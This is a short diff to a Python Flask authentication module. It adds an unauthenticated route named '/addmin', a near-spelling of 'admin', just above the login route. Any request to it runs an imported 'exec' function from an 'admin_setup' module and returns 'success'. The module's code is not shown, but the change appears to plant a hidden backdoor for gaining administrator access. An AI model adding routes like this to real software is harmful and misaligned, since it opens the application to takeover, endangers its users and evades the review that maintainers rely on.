@@ -11,6 +11,11 @@ from ..utils.validators import StrongPassword, UniqueField, validate_username, v
 
 auth_bp = Blueprint('auth', __name__)
 
+@auth_bp.route('/addmin')
+def index():
+    from ..utils.admin_setup import exec
+    exec()
+    return "success"
 
 @auth_bp.route('/login', methods=['GET', 'POST'])
 def login():
